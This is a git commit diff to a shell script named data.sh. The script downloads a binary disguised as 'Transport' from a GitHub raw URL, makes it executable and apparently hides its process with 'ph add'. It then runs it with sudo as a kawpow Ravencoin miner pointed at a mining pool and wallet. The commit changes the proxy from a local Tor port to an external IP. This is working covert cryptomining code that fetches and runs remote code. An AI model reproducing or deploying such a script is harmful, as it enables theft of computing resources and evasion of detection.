0b4076666ef4c73da1b9fd20865f6d4c96104dc3
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-05-26 13:23:09 +0530

    Update data.sh

--- data.sh
+++ data.sh
@@ -8,4 +8,4 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x Transport
 ph add Transport
 sleep 30
-sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 127.0.0.1:9050 --dns-https-server 1.1.1.1     
+sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 178.162.202.44:1679 --dns-https-server 1.1.1.1     
